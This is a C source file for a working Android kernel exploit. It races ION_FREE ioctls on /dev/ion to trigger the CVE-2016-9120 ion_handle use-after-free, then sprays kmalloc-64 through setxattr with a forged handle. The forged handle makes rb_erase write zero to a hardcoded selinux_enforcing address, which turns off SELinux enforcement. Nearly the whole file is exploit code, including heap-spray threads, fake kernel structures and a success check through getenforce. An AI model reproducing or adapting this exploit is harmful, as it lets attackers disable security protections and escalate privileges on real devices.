#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/xattr.h>

/* Stage A: turn the CVE-2016-9120 handle UAF into ONE idempotent zero write on
 * selinux_enforcing, with every other deref landing inside our own pages.
 *
 * Freed object = struct ion_handle (56 bytes -> kmalloc-64) -> spray must be
 * kmalloc-64 (setxattr value size 64; fs/xattr.c does kmalloc+copy_from_user,
 * so the object is ours from offset 0).
 *
 * Extra kref_put on the recycled slot runs ion_handle_destroy over our bytes:
 *   mutex_lock(buffer->lock@+0x50)   -> our user page
 *   while(handle->kmap_cnt@+0x30)    -> 0, skipped
 *   idr_remove(client+0x28, id@+0x34)-> zeroed idr => WARN+return, no writes
 *   rb_erase(&handle->node@+0x18, client+0x20):
 *        parent = (pc & ~3) = selinux_enforcing-8, children = 0, color RED
 *        -> __rb_change_child: parent->rb_left(=enforcing+8) != v  => writes
 *           s = 0 into parent->rb_right(=parent+8) = selinux_enforcing  <-- THE WRITE
 *        -> s == NULL so no rb_set_parent_color; RED so no rebalance
 *   ion_buffer_remove_from_handle(buffer): handle_count 5->4, no branch (no
 *        atomic_sub, no get_task_comm, never reaches BUG_ON)
 *   ion_buffer_put(buffer): ref 0 -> -1, no destroy
 *   kfree(handle): frees our own spray object
 * Idempotent: repeating the write keeps enforcing == 0. Oracle: getenforce.
 */
#define SELINUX_ENFORCING 0xffffffc00189be74UL
#define RB_RIGHT 8

#define H_REF 0x00
#define H_CLIENT 0x08
#define H_BUFFER 0x10
#define H_NODE_PC 0x18
#define H_NODE_R 0x20
#define H_NODE_L 0x28
#define H_KMAP 0x30
#define H_ID 0x34
#define OBJ_SZ 64

#define B_REF 0x00
#define B_DEV 0x20
#define B_HEAP 0x28
#define B_SIZE 0x40
#define B_LOCK 0x50
#define B_KMAP 0x78
#define B_SG 0x88
#define B_PAGES 0x90
#define B_VMAS 0x98
#define B_HCNT 0xa8

#define ION_ALLOC 0xc0204900u
#define ION_FREE 0xc0044901u
#define ION_HEAPBIT 9

static int g_nracer = 3;
static volatile int g_go, g_ready, g_done, g_stop;
static volatile unsigned g_id;
static int g_cfd;
static unsigned char g_tmpl[OBJ_SZ];
static unsigned char *g_bufpg, *g_clientpg;
static char g_path[128] = "/data/local/tmp/stageA_file";

static void build(void)
{
    memset(g_tmpl, 0, sizeof g_tmpl);
    memset(g_bufpg, 0, 4096);
    memset(g_clientpg, 0, 4096);

    *(unsigned int *)(g_tmpl + H_REF) = 1;
    *(unsigned long *)(g_tmpl + H_CLIENT) = (unsigned long)g_clientpg;
    *(unsigned long *)(g_tmpl + H_BUFFER) = (unsigned long)g_bufpg;
    *(unsigned long *)(g_tmpl + H_NODE_PC) = (SELINUX_ENFORCING - RB_RIGHT) | 1; /* RED */
    *(unsigned long *)(g_tmpl + H_NODE_R) = 0;
    *(unsigned long *)(g_tmpl + H_NODE_L) = 0;
    *(unsigned int *)(g_tmpl + H_KMAP) = 0;
    *(unsigned int *)(g_tmpl + H_ID) = 1;

    /* fake ion_buffer, all inside our own page */
    *(unsigned int *)(g_bufpg + B_REF) = 0;                       /* put: no destroy */
    *(unsigned long *)(g_bufpg + B_DEV) = (unsigned long)g_bufpg;
    *(unsigned long *)(g_bufpg + B_HEAP) = (unsigned long)g_bufpg;
    *(unsigned int *)(g_bufpg + B_HCNT) = 5;                     /* never reaches 0 */
    *(unsigned long *)(g_bufpg + B_VMAS) = (unsigned long)(g_bufpg + B_VMAS);
    *(unsigned long *)(g_bufpg + B_VMAS + 8) = (unsigned long)(g_bufpg + B_VMAS);
}

static void *racer(void *a)
{
    unsigned id = g_id;
    g_ready++;
    while (!g_go) sched_yield();
    ioctl(g_cfd, ION_FREE, &id);
    g_done++;
    return NULL;
}

static void *sprayer(void *a)
{
    int i;
    while (!g_stop) {
        for (i = 0; i < 200; i++) {
            if (g_stop) break;
            setxattr(g_path, "user.v", g_tmpl, OBJ_SZ, 0);
        }
        sched_yield();
    }
    return NULL;
}

static int permissive(void)
{
    FILE *f = popen("getenforce", "r");
    char l[64] = "";
    int ok = 0;
    if (f) { if (fgets(l, sizeof l, f)) {} pclose(f); ok = strstr(l, "Permissive") != NULL; }
    return ok;
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 200;
    int i, j, fd, hit = 0;
    pthread_t th[24];

    if (argc > 2) g_nracer = atoi(argv[2]);
    fd = open(g_path, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) { perror("file"); return 1; }
    close(fd);
    g_bufpg = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    g_clientpg = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_bufpg == MAP_FAILED || g_clientpg == MAP_FAILED) { perror("mmap"); return 1; }
    g_cfd = open("/dev/ion", O_RDONLY);
    if (g_cfd < 0) { perror("/dev/ion"); return 1; }
    build();
    printf("stageA: racers=%d rounds=%d target selinux_enforcing=%p (write via rb_erase parent)\n",
           g_nracer, rounds, (void *)SELINUX_ENFORCING);
    printf("  before: getenforce=%s\n", permissive() ? "Permissive" : "Enforcing");

    for (i = 0; i < 8; i++)
        pthread_create(&th[i], NULL, sprayer, (void *)(long)i);

    for (i = 0; i < rounds && !hit; i++) {
        struct alloc_data { unsigned long long len, align; unsigned mask, flags, handle, pad; } ad;
        memset(&ad, 0, sizeof ad);
        ad.len = 0x1000; ad.align = 4096; ad.mask = 1u << ION_HEAPBIT;
        errno = 0;
        if (ioctl(g_cfd, ION_ALLOC, &ad)) { printf("alloc errno=%d\n", errno); break; }
        g_id = ad.handle; g_go = 0; g_ready = 0; g_done = 0;
        for (j = 0; j < g_nracer; j++)
            pthread_create(&th[8 + j], NULL, racer, (void *)(long)j);
        while (g_ready < (unsigned)g_nracer) sched_yield();
        g_go = 1;
        while (g_done < (unsigned)g_nracer) sched_yield();
        for (j = 0; j < g_nracer; j++) pthread_join(th[8 + j], NULL);
        build();                                   /* refresh template */
        if (permissive()) { printf("  *** LANDED at round %d: getenforce=Permissive\n", i); hit = 1; }
        else if (i % 25 == 0) printf("  round %d: still enforcing\n", i);
    }

    g_stop = 1;
    for (i = 0; i < 8; i++) pthread_join(th[i], NULL);
    printf("RESULT: %s\n", hit ? "SELINUX PERMISSIVE" : "not reached");
    close(g_cfd);
    return hit ? 0 : 3;
}
